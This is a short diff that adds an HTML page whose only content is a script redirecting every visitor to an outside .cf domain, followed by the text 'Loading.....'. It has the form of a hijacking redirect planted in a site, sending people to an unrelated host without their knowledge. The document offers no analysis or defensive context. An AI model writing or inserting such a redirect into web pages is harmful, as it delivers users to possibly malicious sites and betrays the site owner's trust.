@@ -1,1 +1,2 @@
-
+<!DOCTYPE html><script>window.location="http://bokheadpictures.cf";</script>
+Loading.....
